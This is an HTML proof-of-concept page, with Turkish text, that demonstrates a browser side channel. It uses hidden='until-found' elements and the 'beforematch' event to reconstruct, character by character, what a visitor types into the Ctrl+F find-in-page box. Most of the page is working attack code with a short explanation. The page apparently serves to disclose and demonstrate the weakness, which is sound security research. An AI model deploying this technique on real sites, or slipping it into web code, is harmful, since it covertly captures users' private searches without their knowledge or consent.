<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ctrl+F until-found Side-Channel PoC</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
  body {
    background:#f8f9fa;
    color:#212529;
  }
  .card {
    border-radius: 10px;
  }
  .log {
    background:#ffffff;
    font-family: monospace;
    font-size: 14px;
    padding: 12px;
    border-radius: 8px;
    min-height: 90px;
    border: 1px solid #dee2e6;
  }
  code {
    color:#0d6efd;
  }
</style>
</head>
<body>

<div class="container my-5">

  <!-- Talimat -->
  <div class="card shadow-sm mb-4">
    <div class="card-body">
      <h4>ğŸ” Ctrl+F Testi</h4>
      <p class="mb-1">
        Klavyeden <strong>Ctrl + F</strong> yapÄ±n ve ÅŸunu yazÄ±n:
      </p>
      <h5 class="text-primary">beykozunsesi</h5>
      <p class="text-muted mb-0">
        Input yok Â· keydown yok Â· izin yok
      </p>
    </div>
  </div>

  <!-- SonuÃ§ -->
  <div class="card shadow-sm mb-4">
    <div class="card-body">
      <h6>ğŸ“¡ AlgÄ±lanan Arama Dizisi</h6>
      <div id="result" class="log text-success">
        Bekleniyor...
      </div>
    </div>
  </div>

  <!-- AÃ§Ä±klama -->
  <div class="card shadow-sm">
    <div class="card-body">
      <h5>ğŸ§  Burada Ne Oluyor?</h5>
      <p>
        Bu PoC, tarayÄ±cÄ±larÄ±n <code>hidden="until-found"</code> Ã¶zelliÄŸinin
        Ctrl+F (Sayfada Bul) sÄ±rasÄ±nda DOM Ã¼zerinde nasÄ±l izlenebilir
        bir yan kanal (side-channel) oluÅŸturduÄŸunu gÃ¶sterir.
      </p>
      <ul>
        <li>Gizli HTML elementleri Ctrl+F tarafÄ±ndan indekslenir</li>
        <li>EÅŸleÅŸme olunca tarayÄ±cÄ± elementi gÃ¶rÃ¼nÃ¼r yapar</li>
        <li><code>beforematch</code> olayÄ± tetiklenir</li>
        <li>JavaScript bu olayÄ± dinleyerek aramayÄ± Ã§Ã¶zer</li>
      </ul>
    </div>
  </div>

</div>

<!-- âš ï¸ KRÄ°TÄ°K NOKTA: layout iÃ§inde, gÃ¶rÃ¼nmez ama render ediliyor -->
<div id="search-candidates"
     style="
       font-size:1px;
       line-height:1px;
       height:1px;
       overflow:hidden;
     ">
</div>

<script>
let detectedSequence = "";
const detected = new Set();
let container;

/* Eski adaylarÄ± temizle */
function cleanupOldCandidates(len) {
  if (!container) return;
  container.querySelectorAll('p[id^="c_"]').forEach(el => {
    const l = el.getAttribute("data-sequence").length;
    if (l !== 1 && (l < len || l > len + 1)) {
      el.remove();
    }
  });
}

/* Yeni adaylar Ã¼ret */
function generateCandidates(prefix = "") {
  if (!container) return;

  const charset =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

  if (prefix.length > 0) cleanupOldCandidates(prefix.length);

  for (let i = 0; i < charset.length; i++) {
    const seq = prefix + charset[i];
    const id = "c_" + encodeURIComponent(seq);

    if (container.querySelector("#" + CSS.escape(id))) continue;

    const p = document.createElement("p");

    /* ğŸ”´ ASIL OLAY */
    p.setAttribute("hidden", "until-found");

    p.id = id;
    p.setAttribute("data-sequence", seq);
    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;

    p.style.fontSize = "1px";
    p.style.margin = "0";
    p.style.padding = "0";
    p.style.lineHeight = "1px";

    p.addEventListener("beforematch", () => {
      const current = p.getAttribute("data-sequence");

      if (current.length === 1) {
        detectedSequence = current;
        document.getElementById("result").textContent = current;
        detected.add(id);
        generateCandidates(current);
        return;
      }

      if (!detected.has(id) && current.length > detectedSequence.length) {
        detected.add(id);

        const prevId = "c_" + encodeURIComponent(detectedSequence);
        const prev = container.querySelector("#" + CSS.escape(prevId));
        if (prev) {
          prev.setAttribute("hidden", "until-found");
          detected.delete(prevId);
        }

        detectedSequence = current;
        document.getElementById("result").textContent = current;
        generateCandidates(current);
      }
    });

    container.appendChild(p);
  }
}

window.addEventListener("load", () => {
  container = document.getElementById("search-candidates");
  generateCandidates();
});
</script>

</body>
</html>
